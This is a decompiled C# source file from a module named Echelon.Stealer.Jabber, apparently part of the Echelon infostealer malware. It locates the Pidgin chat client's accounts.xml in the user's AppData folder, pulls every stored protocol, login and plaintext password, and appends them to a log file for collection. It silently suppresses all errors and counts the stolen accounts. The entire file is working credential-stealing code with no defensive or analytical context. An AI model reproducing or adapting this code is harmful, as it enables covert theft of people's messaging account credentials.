using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Echelon.Stealer.Jabber
{
	// Token: 0x02000015 RID: 21
	internal class Pidgin
	{
		// Token: 0x06000037 RID: 55 RVA: 0x000041B0 File Offset: 0x000023B0
		public static void Start(string directorypath)
		{
			if (File.Exists(Pidgin.PidginPath))
			{
				Directory.CreateDirectory(directorypath + "\\Jabber\\Pidgin\\");
				Pidgin.GetDataPidgin(Pidgin.PidginPath, directorypath + "\\Jabber\\Pidgin\\Pidgin.log");
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x000041E8 File Offset: 0x000023E8
		public static void GetDataPidgin(string PathPn, string SaveFile)
		{
			try
			{
				if (File.Exists(PathPn))
				{
					try
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(new XmlTextReader(PathPn));
						foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
						{
							XmlNode xmlNode = (XmlNode)obj;
							string innerText = xmlNode.ChildNodes[0].InnerText;
							string innerText2 = xmlNode.ChildNodes[1].InnerText;
							string innerText3 = xmlNode.ChildNodes[2].InnerText;
							if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
							{
								break;
							}
							Pidgin.SBTwo.AppendLine("Protocol: " + innerText);
							Pidgin.SBTwo.AppendLine("Login: " + innerText2);
							Pidgin.SBTwo.AppendLine("Password: " + innerText3 + "\r\n");
							Pidgin.PidginAkks++;
							Pidgin.PidginCount++;
						}
						if (Pidgin.SBTwo.Length > 0)
						{
							try
							{
								File.AppendAllText(SaveFile, Pidgin.SBTwo.ToString());
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400002E RID: 46
		public static int PidginCount;

		// Token: 0x0400002F RID: 47
		public static int PidginAkks;

		// Token: 0x04000030 RID: 48
		private static readonly string PidginPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple\\accounts.xml");

		// Token: 0x04000031 RID: 49
		private static StringBuilder SBTwo = new StringBuilder();
	}
}
